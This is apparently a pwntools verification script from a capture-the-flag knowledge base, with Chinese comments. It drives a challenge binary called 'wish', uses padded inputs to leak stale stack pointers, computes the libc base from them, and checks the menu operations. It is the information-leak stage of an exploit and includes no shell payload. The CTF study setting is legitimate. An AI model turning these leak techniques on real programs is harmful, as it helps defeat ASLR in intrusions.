# wish — KB 验证脚本 (2026-09-11, aegisx/solver:full + 附件 libc + 配套 ld-2.27.so)
# 来源: KB 整理时新写; 验证结论已写入 SOLVE.md「已确认事实」
# 状态: 可跑 —— 运行方式见 docker 命令于 SOLVE.md 末尾

#!/usr/bin/env python3
"""KB verification: run wish with its bundled libc via matching ld-2.27.so.
Tests: (1) menu reaches first prompt, (2) choice7 stale-stack leak slots +0x18/+0x28,
(3) DELTA fingerprint, (4) choice1/2 money ops work."""
from pwn import *
context.log_level = 'error'
import struct
def u64x(b): return struct.unpack('<Q', b.ljust(8, b'\x00')[:8])[0]

p = process(['/w/ld-2.27.so', '/w/wish'], env={'LD_LIBRARY_PATH': '/w'})
p.recvuntil(b'What is your wish?\n', timeout=5)
print('[menu] OK - first prompt received')

p.sendline(b'7')
p.recvuntil(b'Okay, brother, what do you want to know?\n', timeout=5)
p.send(b'A'*0x18)
line = p.recvline(timeout=5)
leak = u64x(line[0x18:0x18+6]) if len(line) > 0x18 else 0
print('[choice7 print1] len=%d slot+0x18=%#x low12=%#x' % (len(line), leak, leak & 0xfff))
p.recvuntil(b'What else do you want to know?\n', timeout=5)
p.send(b'B'*0x28)
line2 = p.recvline(timeout=5)
leak2 = u64x(line2[0x28:0x28+6]) if len(line2) > 0x28 else 0
print('[choice7 print2] len=%d slot+0x28=%#x low12=%#x' % (len(line2), leak2, leak2 & 0xfff))
if leak and leak2:
    print('DELTA(slot28-slot18) = %#x  (transcript attachment value: 0x35f3ad)' % (leak2 - leak))
    print('libc_base(slot18) = %#x page-aligned=%s' % (leak - 0x8d3b3, (leak - 0x8d3b3) & 0xfff == 0))
p.recvuntil(b'You can also ask questions for the last time\n', timeout=5)
p.send(b'C'*8)
p.recvuntil(b'What is your wish?\n', timeout=5)
print('[post-choice7] menu restored')

p.sendline(b'1'); p.recvuntil(b'Which one?\n', timeout=5); p.sendline(b'150')
r = p.recvuntil(b'What is your wish?\n', timeout=5)
print('[choice1] tail:', r[-80:])
p.sendline(b'2')
r = p.recvuntil(b'What is your wish?\n', timeout=5)
print('[choice2] tail:', r[-80:])
p.close()
